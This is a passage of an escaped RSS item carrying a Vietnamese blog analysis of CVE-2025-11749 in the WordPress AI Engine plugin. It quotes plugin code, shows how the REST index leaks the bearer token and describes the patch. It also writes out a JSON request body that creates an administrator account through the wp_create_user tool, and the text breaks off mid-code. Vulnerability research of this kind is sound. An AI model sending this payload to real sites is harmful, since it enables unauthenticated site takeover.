    <item>
      <title>CVE-2025-11749 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-01-cve-2025-11749/</link>
      <pubDate>Thu, 01 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-01-cve-2025-11749/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin AI Engine cho WordPress bị lỗ hổng &lt;strong&gt;lộ thông tin nhạy cảm&lt;/strong&gt; trong tất cả các phiên bản từ trước đến &lt;strong&gt;3.1.3&lt;/strong&gt;, thông qua endpoint REST API &lt;strong&gt;/mcp/v1/&lt;/strong&gt;. Lỗ hổng này làm lộ &lt;strong&gt;Bearer Token&lt;/strong&gt; khi tùy chọn &lt;strong&gt;“No-Auth URL”&lt;/strong&gt; được bật. Điều này cho phép kẻ tấn công &lt;strong&gt;không cần xác thực&lt;/strong&gt; lấy được bearer token, từ đó có thể truy cập vào một phiên làm việc hợp lệ và thực hiện nhiều hành động như &lt;strong&gt;tạo tài khoản quản trị viên mới&lt;/strong&gt;, dẫn đến &lt;strong&gt;leo thang đặc quyền&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11749&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11749&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.1.3&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.1.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ai-engine/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress AI Engine Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;AI Engine&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.1.3&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.1.4&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký API:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function rest_api_init() {&#xA;    // Load bearer token if not already loaded&#xA;    if ( $this-&amp;gt;bearer_token === null ) {&#xA;      $this-&amp;gt;bearer_token = $this-&amp;gt;core-&amp;gt;get_option( &amp;#39;mcp_bearer_token&amp;#39; );&#xA;    }&#xA;    ...&#xA;    // No-Auth URL endpoints (with token in path)&#xA;    $noauth_enabled = $this-&amp;gt;core-&amp;gt;get_option( &amp;#39;mcp_noauth_url&amp;#39; );&#xA;    if ( $noauth_enabled &amp;amp;&amp;amp; !empty( $this-&amp;gt;bearer_token ) ) {&#xA;        ...&#xA;        register_rest_route( $this-&amp;gt;namespace, &amp;#39;/&amp;#39; . $this-&amp;gt;bearer_token . &amp;#39;/messages&amp;#39;, [&#xA;            &amp;#39;methods&amp;#39; =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;            &amp;#39;callback&amp;#39; =&amp;gt; [ $this, &amp;#39;handle_message&amp;#39; ],&#xA;            &amp;#39;permission_callback&amp;#39; =&amp;gt; function ( $request ) {&#xA;                return $this-&amp;gt;handle_noauth_access( $request );&#xA;            },&#xA;        ] );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Điều kiện để các API này hoạt động là:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Bearer Token&lt;/strong&gt; phải được thiết lập (đã tồn tại giá trị).&lt;/li&gt;&#xA;&lt;li&gt;Tùy chọn &lt;strong&gt;No-Auth URL&lt;/strong&gt; phải được bật.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Ta có thể hoàn thành các thiết lập này trong Admin Dashboard (Endpoint: &lt;code&gt;/wp-admin/admin.php?page=mwai_settings&amp;amp;nekoTab=settings&lt;/code&gt;) theo thứ tự như sau:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/enable.png&#34; title=&#34;Setup Bearer Token và No-Auth URL&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/enable.png&#34; data-sub-html=&#34;&lt;h2&gt;Enable&lt;/h2&gt;&lt;p&gt;Setup Bearer Token và No-Auth URL&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/enable.png&#39; alt=&#34;Enable&#34; height=&#34;472&#34; width=&#34;868&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Setup Bearer Token và No-Auth URL&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ta đặt &lt;strong&gt;Bearer Token&lt;/strong&gt; thành 1 chuỗi bất kì, ví dụ: &lt;code&gt;aaaaaaaaaa&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Chuỗi này đóng vai trò như &lt;strong&gt;chìa khóa bí mật để&lt;/strong&gt; truy cập các API này.&#xA;Chỉ những ai biết giá trị này mới có thể gọi được các endpoint tương ứng.&lt;/p&gt;&#xA;&lt;p&gt;Tuy nhiên, theo mô tả của CVE thì đây là 1 phần của lỗ hổng, ngay cả người dùng chưa đăng nhập cũng có biết giá trị của &lt;strong&gt;Bearer Token&lt;/strong&gt; =&amp;gt; không còn là &lt;strong&gt;bí mật&lt;/strong&gt; nữa.&lt;/p&gt;&#xA;&lt;p&gt;Mọi thứ được &lt;strong&gt;bật mí&lt;/strong&gt; khi ta truy cập &lt;code&gt;/wp-json&lt;/code&gt;, WordPress sẽ trả về &lt;strong&gt;REST API Index&lt;/strong&gt; — tức là bản mô tả toàn bộ các API mà website đang cung cấp, bao gồm các API chứa &lt;strong&gt;Bearer Token&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/exposed.png&#34; title=&#34;Giá trị Bearer Token trong response&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/exposed.png&#34; data-sub-html=&#34;&lt;h2&gt;Exposed&lt;/h2&gt;&lt;p&gt;Giá trị Bearer Token trong response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/exposed.png&#39; alt=&#34;Exposed&#34; height=&#34;877&#34; width=&#34;1570&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Giá trị Bearer Token trong response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Tất cả người dùng (kể cả &lt;strong&gt;chưa đăng nhập&lt;/strong&gt;) đều có thể gọi đến &lt;code&gt;/wp-json&lt;/code&gt; này.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá &lt;strong&gt;v3.1.4&lt;/strong&gt; thêm tùy chọn &lt;code&gt;&#39;show_in_rest&#39; =&amp;gt; false&lt;/code&gt; khi đăng ký API, nhằm &lt;strong&gt;ẩn các endpoint khỏi &lt;code&gt;/wp-json&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/patch.png&#34; title=&#34;Bản vá&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;Bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/patch.png&#39; alt=&#34;Patch&#34; height=&#34;601&#34; width=&#34;1770&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Điều này giúp:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Không hiển thị API trong danh sách REST&lt;/li&gt;&#xA;&lt;li&gt;Giảm khả năng bị dò quét&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Tuy nhiên:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;API vẫn truy cập được nếu biết URL&lt;/li&gt;&#xA;&lt;li&gt;Không thay thế cho cơ chế xác thực an toàn&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;👉 Đây chỉ là biện pháp che giấu, không phải bảo mật thực sự.&lt;/p&gt;&#xA;&lt;p&gt;API đã được đăng ký với &lt;code&gt;permission_callback&lt;/code&gt; là &lt;code&gt;handle_noauth_access&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_noauth_access( $request ) {&#xA;    // For no-auth URLs, the token is already verified by being in the URL path&#xA;    // Double-check that the route actually contains the token&#xA;    $route = $request-&amp;gt;get_route();&#xA;    if ( strpos( $route, &amp;#39;/&amp;#39; . $this-&amp;gt;bearer_token . &amp;#39;/&amp;#39; ) === false ) {&#xA;      if ( $this-&amp;gt;logging ) {&#xA;        error_log( &amp;#39;[AI Engine MCP] ❌ Invalid no-auth URL access attempt.&amp;#39; );&#xA;      }&#xA;      return false;&#xA;    }&#xA;&#xA;    // Set the current user to admin since token is valid&#xA;    if ( $admin = $this-&amp;gt;core-&amp;gt;get_admin_user() ) {&#xA;      wp_set_current_user( $admin-&amp;gt;ID, $admin-&amp;gt;user_login );&#xA;    }&#xA;    return true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm thực hiện kiểm tra &lt;strong&gt;Bearer Token&lt;/strong&gt; có hợp lệ hay không. Nếu hợp lệ, hàm sẽ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp_set_current_user( $admin-&amp;gt;ID, $admin-&amp;gt;user_login );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Gán người dùng hiện tại thành admin, cho phép &lt;code&gt;&amp;quot;request hiện tại&amp;quot;&lt;/code&gt; tiếp tục thực thi với toàn quyền quản trị. Sau khi request kết thúc thì quyền admin cũng hết.&lt;/p&gt;&#xA;&lt;p&gt;Khi ta truy cập endpoint &lt;code&gt;/wp-json/mcp/v1/aaaaaaaaaa/messages&lt;/code&gt; thì callback &lt;code&gt;handle_message&lt;/code&gt; sẽ được gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_message( WP_REST_Request $request ) {&#xA;    ...&#xA;    $raw = $request-&amp;gt;get_body();&#xA;    $dat = json_decode( $raw, true );&#xA;    ...&#xA;    $id = $dat[&amp;#39;id&amp;#39;] ?? null;&#xA;    $method = $dat[&amp;#39;method&amp;#39;] ?? null;&#xA;    ...&#xA;    // It&amp;#39;s a notification, no ID = no reply&#xA;    if ( $id === null &amp;amp;&amp;amp; $method !== null ) {&#xA;      return new WP_REST_Response( null, 204 );&#xA;    }&#xA;    ...&#xA;    try {&#xA;&#xA;      $reply = null;&#xA;&#xA;      #region Methods switch&#xA;      switch ( $method ) {&#xA;        ...&#xA;        case &amp;#39;tools/call&amp;#39;:&#xA;          $params = $dat[&amp;#39;params&amp;#39;] ?? [];&#xA;          $tool = $params[&amp;#39;name&amp;#39;] ?? &amp;#39;&amp;#39;;&#xA;          $arguments = $params[&amp;#39;arguments&amp;#39;] ?? [];&#xA;&#xA;          if ( $this-&amp;gt;logging ) {&#xA;            error_log( &amp;#39;[AI Engine MCP SSE] 🔧 tools/call - Tool: &amp;#39; . $tool );&#xA;            error_log( &amp;#39;[AI Engine MCP SSE] 🔧 tools/call - Arguments: &amp;#39; . wp_json_encode( $arguments ) );&#xA;          }&#xA;&#xA;          try {&#xA;            $reply = $this-&amp;gt;execute_tool( $tool, $arguments, $id );&#xA;            if ( $this-&amp;gt;logging ) {&#xA;              error_log( &amp;#39;[AI Engine MCP SSE] ✅ tools/call - Success for tool: &amp;#39; . $tool );&#xA;            }&#xA;          }&#xA;          catch ( Exception $e ) {&#xA;            if ( $this-&amp;gt;logging ) {&#xA;              error_log( &amp;#39;[AI Engine MCP SSE] ❌ tools/call - Error: &amp;#39; . $e-&amp;gt;getMessage() );&#xA;            }&#xA;            throw $e;&#xA;          }&#xA;          break;&#xA;        ...&#xA;      }&#xA;      #endregion&#xA;&#xA;      if ( $reply ) {&#xA;        // Don&amp;#39;t log response queuing - it&amp;#39;s too noisy&#xA;        $this-&amp;gt;store_message( $sess, $reply );&#xA;      }&#xA;&#xA;    }&#xA;    catch ( Exception $e ) {&#xA;      $this-&amp;gt;queue_error( $sess, $id, -32603, &amp;#39;Internal error&amp;#39;, $e-&amp;gt;getMessage() );&#xA;    }&#xA;&#xA;    return new WP_REST_Response( null, 204 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm nhận một request JSON, phân tích nội dung, thực thi hành động tương ứng và trả kết quả (nếu cần).&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Nếu là notification (không có &lt;code&gt;id&lt;/code&gt;) → Không cần phản hồi → trả HTTP 204&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ($id === null &amp;amp;&amp;amp; $method !== null)&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Xử lý theo method: Nếu là &lt;code&gt;tools/call&lt;/code&gt; thì lấy các param cần thiết và gọi đến &lt;code&gt;execute_tool( $tool, $arguments, $id );&lt;/code&gt; để thực thi tool nội bộ.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Request body hiện tại sẽ như sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;id&amp;#34;: 1,&#xA;  &amp;#34;method&amp;#34;: &amp;#34;tools/call&amp;#34;,&#xA;  &amp;#34;params&amp;#34;: {&#xA;  },&#xA;  &amp;#34;name&amp;#34;: &amp;#34;2&amp;#34;,&#xA;  &amp;#34;arguments&amp;#34;: &amp;#34;3&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;private function execute_tool( $tool, $args, $id ) {&#xA;    try {&#xA;      ...&#xA;      $filtered = apply_filters( &amp;#39;mwai_mcp_callback&amp;#39;, null, $tool, $args, $id, $this );&#xA;      ...&#xA;    }&#xA;    catch ( Exception $e ) {&#xA;      return $this-&amp;gt;rpc_error( $id, -32603, $e-&amp;gt;getMessage() );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;execute_tool&lt;/code&gt; gọi đến các callback đã đăng ký cho filter &lt;code&gt;mwai_mcp_callback&lt;/code&gt; cùng 3 tham số đã truyền vào trước đó.&lt;/p&gt;&#xA;&lt;p&gt;Khi search với từ khóa &lt;code&gt;mwai_mcp_callback&lt;/code&gt; ta thấy nó được đăng ký trong class &lt;code&gt;Meow_MWAI_Labs_MCP_Core&lt;/code&gt;, nơi ảnh hưởng trực tiếp đến lỗ hổng này.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/filter.png&#34; title=&#34;Filter mwai_mcp_callback&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/filter.png&#34; data-sub-html=&#34;&lt;h2&gt;Filter&lt;/h2&gt;&lt;p&gt;Filter mwai_mcp_callback&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/filter.png&#39; alt=&#34;Filter&#34; height=&#34;422&#34; width=&#34;1740&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Filter mwai_mcp_callback&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Điều kiện để filter này hoạt động là class &lt;code&gt;Meow_MWAI_Labs_MCP_Core&lt;/code&gt; phải được khởi tạo ở đâu đó.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/init.png&#34; title=&#34;Meow_MWAI_Labs_MCP_Core được khởi tạo&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/init.png&#34; data-sub-html=&#34;&lt;h2&gt;Init&lt;/h2&gt;&lt;p&gt;Meow_MWAI_Labs_MCP_Core được khởi tạo&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/init.png&#39; alt=&#34;Init&#34; height=&#34;669&#34; width=&#34;1133&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Meow_MWAI_Labs_MCP_Core được khởi tạo&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Điều này chỉ xảy ra khi MCP Features WordPress được bật. Ta có thể hoàn thành các thiết lập này trong Admin Dashboard (Endpoint: &lt;code&gt;/wp-admin/admin.php?page=mwai_settings&amp;amp;nekoTab=settings&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/enable1.png&#34; title=&#34;Bật MCP Features WordPress&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/enable1.png&#34; data-sub-html=&#34;&lt;h2&gt;Enable1&lt;/h2&gt;&lt;p&gt;Bật MCP Features WordPress&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/enable1.png&#39; alt=&#34;Enable1&#34; height=&#34;353&#34; width=&#34;851&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Bật MCP Features WordPress&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi filter được áp dụng, callback &lt;code&gt;handle_call&lt;/code&gt; sẽ được gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_call( $prev, string $tool, array $args, int $id ) {&#xA;    // Security check is already done in the MCP auth layer&#xA;    // If we reach here, the user is authorized to use MCP&#xA;    if ( !empty( $prev ) || !isset( $this-&amp;gt;tools()[ $tool ] ) ) {&#xA;      return $prev;&#xA;    }&#xA;    return $this-&amp;gt;dispatch( $tool, $args, $id );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nếu là tool hợp lệ =&amp;gt; gọi đến &lt;code&gt;dispatch( $tool, $args, $id )&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Trong danh sách tool hợp lệ, gồm có tool &lt;code&gt;wp_create_user&lt;/code&gt; dùng để tạo user mới =&amp;gt; Tạo được người dùng với quyền &lt;code&gt;administrator&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/valid_tool.png&#34; title=&#34;Tool wp_create_user&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/valid_tool.png&#34; data-sub-html=&#34;&lt;h2&gt;Tool&lt;/h2&gt;&lt;p&gt;Tool wp_create_user&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/valid_tool.png&#39; alt=&#34;Tool&#34; height=&#34;411&#34; width=&#34;1098&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Tool wp_create_user&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Tool này yêu cầu các thuộc tính: &lt;code&gt;user_login&lt;/code&gt;, &lt;code&gt;user_email&lt;/code&gt;, &lt;code&gt;user_pass&lt;/code&gt;, &lt;code&gt;display_name&lt;/code&gt;, &lt;code&gt;role&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Request body hiện tại sẽ như sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;id&amp;#34;: 1,&#xA;  &amp;#34;method&amp;#34;: &amp;#34;tools/call&amp;#34;,&#xA;  &amp;#34;params&amp;#34;: {&#xA;    &amp;#34;name&amp;#34;: &amp;#34;wp_create_user&amp;#34;,&#xA;    &amp;#34;arguments&amp;#34;: {&#xA;      &amp;#34;user_login&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;user_email&amp;#34;: &amp;#34;hacker@gmail.com&amp;#34;,&#xA;      &amp;#34;user_pass&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;display_name&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;role&amp;#34;: &amp;#34;administrator&amp;#34;&#xA;    }&#xA;  },&#xA;  &amp;#34;name&amp;#34;: &amp;#34;2&amp;#34;,&#xA;  &amp;#34;arguments&amp;#34;: &amp;#34;3&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tiếp tục phân tích hàm &lt;code&gt;dispatch&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private function dispatch( string $tool, array $a, int $id ): array {&#xA;    $r = [ &amp;#39;jsonrpc&amp;#39; =&amp;gt; &amp;#39;2.0&amp;#39;, &amp;#39;id&amp;#39; =&amp;gt; $id ];&#xA;    switch ( $tool ) {&#xA;    ...&#xA;      case &amp;#39;wp_create_user&amp;#39;:&#xA;        $data = [&#xA;          &amp;#39;user_login&amp;#39; =&amp;gt; sanitize_user( $a[&amp;#39;user_login&amp;#39;] ),&#xA;          &amp;#39;user_email&amp;#39; =&amp;gt; sanitize_email( $a[&amp;#39;user_email&amp;#39;] ),&#xA;          &amp;#39;user_pass&amp;#39; =&amp;gt; $a[&amp;#39;user_pass&amp;#39;] ?? wp_generate_password( 12, true ),&#xA;          &amp;#39;display_name&amp;#39; =&amp;gt; sanitize_text_field( $a[&amp;#39;display_name&amp;#39;] ?? &amp;#39;&amp;#39; ),&#xA;          &amp;#39;role&amp;#39; =&amp;gt; sanitize_key( $a[&amp;#39;role&amp;#39;] ?? get_option( &amp;#39;default_role&amp;#39;, &amp;#39;subscriber&amp;#39; ) ),&#xA;        ];&#xA;        $uid = wp_insert_user( $data );&#xA;        if ( is_wp_error( $uid ) ) {&#xA;          $r[&amp;#39;error&amp;#39;] = [ &amp;#39;code&amp;#39; =&amp;gt; $uid-&amp;gt;get_error_code(), 